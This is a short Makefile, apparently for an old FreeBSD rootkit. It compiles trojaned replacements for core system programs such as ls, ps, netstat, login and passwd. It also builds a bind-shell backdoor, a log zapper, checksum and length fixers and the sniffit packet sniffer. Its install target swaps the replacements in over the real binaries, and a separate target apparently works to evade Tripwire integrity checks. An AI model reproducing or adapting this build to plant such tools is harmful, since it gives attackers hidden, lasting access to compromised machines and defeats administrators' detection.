SUB=chpass inetd login ls du netstat ifconfig passwd ps rshd syslogd
PATHS=/bin/ls /usr/bin/chpass /usr/bin/login /usr/bin/passwd /bin/ps /usr/libexec/rshd /usr/bin/netstat /sbin/ifconfig /usr/sbin/syslogd /usr/sbin/inetd
FIX=fix
ADLEN=addlen
ZAP=zapbsd2
BSHELL=bindshell
UTILS=$(FIX) $(ADLEN) $(ZAP) $(BSHELL)
SNIFFIT=sniffit.0.3.3

all: $(UTILS)
	cd $(SNIFFIT); make freebsd; cd ..
	for i in $(SUB); do cd $$i; make; strip $$i; cd ..; done

$(FIX): $(FIX).o

$(ADLEN): $(ADLEN).o

$(ZAP): $(ZAP).o

$(BSHELL): $(BSHELL).o

install:
	@install.sh $(PATHS)

clean:
	rm -f $(UTILS) *.o
	cd $(SNIFFIT); make clean; cd ..
	for i in $(SUB); do cd $$i; make clean; cd ..; done

tripwire:
	@dotrip.sh $(PATHS)
